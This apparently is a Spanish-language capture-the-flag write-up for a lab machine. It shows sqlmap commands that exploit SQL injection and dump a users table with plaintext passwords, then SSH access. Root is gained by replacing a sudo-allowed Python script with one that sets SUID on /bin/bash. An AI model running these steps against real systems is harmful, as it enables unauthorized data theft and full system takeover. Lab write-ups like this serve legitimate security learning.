## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

En la web hay una barra de búsqueda que al insertar algo devuelve “unauthorized query” dando a entender que es una base de datos.

Pruebo fuzzear la web y no hay nada interesante, paso directamente a la Injección SQL interceptando la petición con BurpSuite.

Copio y pego la petición en un archivo llamado “request.txt”

```bash
sqlmap -r request.txt --dbs
# Info:
available databases [2]:
[*] information_schema
[*] testdb
```

Interesa testdb.

```bash
sqlmap -r request.txt -D testdb --tables
# Info:
Database: testdb
[1 table]
+-------+
| users |
+-------+
```

Dumpeo la tabla:

```bash
sqlmap -r request.txt -D testdb -T users --dump
# Info:
Database: testdb
Table: users
[3 entries]
+----+---------------+----------+
| id | password      | username |
+----+---------------+----------+
| 1  | adminpassword | admin    |
| 2  | user1password | user1    |
| 3  | kvzlxpassword | kvzlx    |
+----+---------------+----------+
```

Pruebo todos los usuarios en SSH y funciona kvzlx.

## Escalada

```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/python3 /home/kvzlx/system_info.py
```

Como este archivo esta en la carpeta del usuario se puede eliminar:

```bash
rm /home/kvzlx/system_info.py
```

Lo reemplazo con un archivo llamado igual con contenido para establecer la bash con permisos SUID:

```python
import os

def set_suid():
    try:
        # Cambiar permisos con chmod u+s
        os.system("chmod u+s /bin/bash")
        print("[+] SUID establecido correctamente en /bin/bash.")
    except Exception as e:
        print(f"[-] Error al establecer SUID: {e}")

if __name__ == "__main__":
    print("[*] Intentando establecer SUID en /bin/bash...")
    set_suid()
```

Lo ejecuto:

```bash
sudo /usr/bin/python3 /home/kvzlx/system_info.py
bash -p
```

Listo.
